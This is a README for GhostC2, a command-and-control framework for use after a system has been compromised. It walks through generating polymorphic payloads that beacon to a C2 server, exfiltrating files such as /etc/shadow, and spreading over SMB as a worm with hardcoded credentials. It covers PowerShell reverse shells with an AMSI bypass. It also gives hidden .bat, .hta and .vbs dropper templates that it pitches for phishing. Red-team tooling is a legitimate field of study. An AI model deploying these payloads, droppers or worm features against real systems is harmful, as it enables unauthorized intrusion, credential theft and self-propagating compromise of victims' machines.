
# 👻 GhostC2

GhostC2 is a modular, encrypted, post-exploitation command-and-control (C2) framework built with Python and Flask. It features real-time WebSocket communication, polymorphic payload generation, structured JSON tasking, operator authentication, optional `.exe` packaging, and a fully interactive file browser UI.

Check out the wiki for an Operator Quickstart Guide.

---

## 🚀 Features

* 🔐 AES-256 encrypted communication (symmetric)
* 🌐 Real-time bidirectional WebSocket tasking
* 🧠 Operator web console with live terminal view
* 🧼 Polymorphic payload generator with randomized variables
* 🗞️ Structured JSON tasking for all agent features (stealth & obfuscation compatible)
* 🖥️ Optional `.exe` compilation with PyInstaller
* 🛡️ Flask-Login based access control
* 🗞️ SQLite-based task/result logging
* 🔍 Network Port Scanning (`scan <subnet> ports:<port1>,<port2>...`)
* 📂 Interactive File Browser UI (NEW, works with obfuscated payloads)
* 🧬 Self-Propagating Worm Mode via SMB
* 📎 PowerShell Dropper Generator (.bat, .hta, .vbs)
* ♻️ Per-payload AES key registration
* 💾 File Exfil + Live Browse System

---

> **NOTE:**
> All dashboard actions (browse, getfile, scan, shell, etc.) now use JSON tasking by default.
> Payloads support full obfuscation and polymorphism with every feature.

---

## 📁 Project Structure

```
GhostC2/
├── builds/                     # Compiled payloads (.py, .exe)
├── downloads/                  # Exfiltrated files from agents
├── output/                     # (Optional legacy output dir)
├── payloads/                   # WebSocket and polling Python agents
│   ├── ghost_socket_payload.py
│   └── ...                     # (other agent scripts)
├── server/
│   ├── app.py                  # Main Flask + SocketIO server
│   ├── ps_handler.py           # PowerShell reverse shell TCP listener
│   ├── templates/              # HTML templates for dashboard, console, login
│   └── payloads/               # (Generated PowerShell payloads)
├── static/
│   └── payloads/               # (Droppers: .bat, .hta, .vbs)
├── tools/
│   ├── generate_payload.py     # Payload generator script
│   └── ps_builder.py           # PowerShell payload builder
├── utils/
│   └── crypto.py               # AES encrypt/decrypt helpers
└── README.md
```

---

## ⚙️ Setup

### 1. Install dependencies

```bash
pip install flask flask-login flask-socketio eventlet pyinstaller
```

### 2. Run the server

```bash
cd server
python app.py
```

Visit [http://localhost:8080](http://localhost:8080)

**Default Login:**

```
Username: admin
Password: ghostpass123
```

---

## 👾 Payloads

                                  
  ![image](https://github.com/user-attachments/assets/16f903da-f6fd-49eb-bc9d-dcee143c7c3d)




### ✅ WebSocket Agent *(experimental – not recommended for active use)*

```bash
python payloads/ghost_socket_payload.py
```

---

### 🧼 Generate Polymorphic Payload *(recommended)*

```bash
# Generate Python payload
python tools/generate_payload.py

# With .exe output
python tools/generate_payload.py --exe
```

---

### 🌐 Example: Generate payload for 10.10.10.10

```bash
python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --result http://10.10.10.10:8080/result
```

To also compile to `.exe`:

```bash
python tools/generate_payload.py   --c2 http://10.10.10.10:8080/beacon   --result http://10.10.10.10:8080/result   --exe
```

To enable worm propagation:

```bash
python tools/generate_payload.py --worm
```

> Payloads now include a unique AES key and register it with the server on first contact.

---

## 📝 Example JSON Tasks

When tasks are queued (by the dashboard, or via API), they’re sent as JSON to the agent:

```json
{
  "action": "browse",
  "path": "/home/user/"
}
```

Shell command:

```json
{
  "action": "shell",
  "command": "whoami"
}
```

File exfil:

```json
{
  "action": "getfile",
  "path": "/etc/shadow"
}
```

> The dashboard generates these automatically when you click actions or send tasks.

---

## 🖥️ Live Console Terminal

GhostC2 includes a web-based console for interacting with beacons in real-time.

![image](https://github.com/user-attachments/assets/1005c816-3c41-4da1-930d-c655116b73ab)


### ✅ Features

* WebSocket-powered command/result loop
* Real-time session interaction
* Preloaded recon commands
* JSON result support (e.g., `scan`)
* Beacon targeting + logging

---

## 📂 Interactive File Browser (NEW)

GhostC2 now supports an interactive file browser for any active beacon, fully compatible with obfuscation and polymorphic builds.

![image](https://github.com/user-attachments/assets/58740671-32e9-4a0f-8b94-6b2237e63a1a)


* Browse directory trees live in the dashboard
* Supports both Linux/Mac and Windows paths
* Handles missing/ghost files gracefully
* Uses structured JSON tasks for full stealth

---

## 📂 File Exfiltration

Agent will:

1. Base64 the file
2. AES encrypt the result
3. Send to server
4. Server saves to `server/downloads/<hostname>/`

---

## 🔍 Network Scanning

Agent will:

* Scan the provided subnet and ports
* Return open/closed results in JSON
* Format them in the dashboard

---

## 🧬 Worm Propagation Mode

![image](https://github.com/user-attachments/assets/c05035b3-a952-451f-b3c1-01ff8eac7fed)


Payloads generated with `--worm` will:

* Scan local subnet for port 445
* Try hardcoded SMB creds
* Drop and remotely execute `worm.py`

Useful for:

* Simulating worm-like behavior
* Lateral movement in test labs

---

## 🔧 PowerShell Payload Generator



GhostC2 now supports polymorphic PowerShell reverse shell payloads for Windows agents.

### ✅ Features:

* Encrypted TCP reverse shell using `System.Net.Sockets.TcpClient`
* Randomized variable names per build
* Auto-appended `PS C:\>`-style prompt
* Compatible with manual execution or droppers
* Optionally served via `/generate_ps_payload`
* AMSI bypass + junk code injection

---

### 🧪 Generating a PowerShell Payload

To generate a `.ps1` stager:

1. Run the Flask server:

   ```bash
   python3 server/app.py
   ```

2. Navigate to the dashboard and click:
   **“Generate PowerShell Payload”**

3. The generated payload will be saved to:

   ```
   /server/payloads/ps_payload_<timestamp>.ps1
   ```

4. It will be automatically served for download.

---

### 🔌 Running the Payload on Target

Run the payload on a Windows target using:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\ps_payload_20250517_XXXXXX.ps1
```

> ⚠️ Ensure `ps_handler.py` is running and listening on port `1443`:

```bash
sudo python3 server/ps_handler.py
```

---

### 🧼 Customizing the Payload

To change the default connection host/port:

Edit `tools/ps_builder.py`:

```python
host = "YOUR_C2_IP"
port = 1443
```

---

## 🧰 PowerShell Dropper Generator (**NEW**)

![image](https://github.com/user-attachments/assets/2b45beea-eced-435f-be8b-df07f5516f1b)


GhostC2 now supports **one-click, base64-encoded PowerShell droppers** for Windows phishing and lateral movement, in `.bat`, `.hta`, and `.vbs` formats.

### ✅ Features:

* Supports *any* PowerShell payload (multi-line, obfuscated, AMSI bypass, etc.)
* Base64-encoding is default and recommended for all wrapper types (`.bat`, `.hta`, `.vbs`)
* Classic inline mode available for legacy single-line scripts

---

### 🧪 Generating a Dropper

1. Run the Flask server:

   ```bash
   python3 server/app.py
   ```
2. Navigate to the dashboard and click:
   **“Generate PS Dropper”**
3. Paste your `.ps1` payload, select the desired wrapper, and generate.
4. Download your dropper from the dashboard.

---

### **Example Outputs**

#### **.bat Wrapper**

```bat
powershell -nop -w hidden -ep bypass -EncodedCommand <BASE64>
```

#### **.hta Wrapper**

```html
<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w hidden -ep bypass -EncodedCommand <BASE64>"
self.close
</script>
```

#### **.vbs Wrapper**

```vb
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w hidden -ep bypass -EncodedCommand <BASE64>", 0
```

* Replace `<BASE64>` with the encoded payload (generated automatically).
* These droppers will execute **any PowerShell payload**, regardless of complexity.

---

### 🛡️ **Why Base64?**

* **Handles any script** (multi-line, special chars, quotes)
* **OPSEC-friendly**—mimics real red team and APT tradecraft
* **Bypasses most encoding/quoting errors** in delivery chains

Base64-encoding is enabled by default and recommended for all dropper types.

---

### 📝 Advanced Options

* **Checkbox** on the dropper generation page allows switching between encoded and classic inline payloads (not recommended unless you have a single-line command).
* All droppers are saved to `server/static/payloads/` and available for download via the dashboard.

---

> **Pro Tip:**
> To decode and review any generated PowerShell dropper’s command, use:
>
> ```powershell
> [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<BASE64>'))
> ```

---

### ⚡ **Red Team Use Cases**

* Phishing initial access via weaponized document droppers
* Living-off-the-land lateral movement (SMB, RDP, etc.)
* Automated campaign payload delivery with robust evasion

---

## 🧠 Roadmap

* `.hta`, `.bat`, and `.vbs` wrappers ✅
* AMSI/ETW bypass options ✅
* Dashboard-based file download from browser view ✅
* JSON/structured tasking for *all* agent features ✅
* Dashboard-based one-liners for download & exec 🔜
* Persistence options: registry, startup folder, scheduled task 🔜

---

## 🔐 Security Notes

* AES-encrypted traffic throughout
* Operator auth required for all access
* Session isolation by beacon hostname

---

## ⚠️ Legal

GhostC2 is for **authorized red team or academic use only**.

---

## 🧠 Built by Edward Wolfgang

* GitHub: [@wolfwashere](https://github.com/wolfwashere)
* Project: GhostC2 v1.0
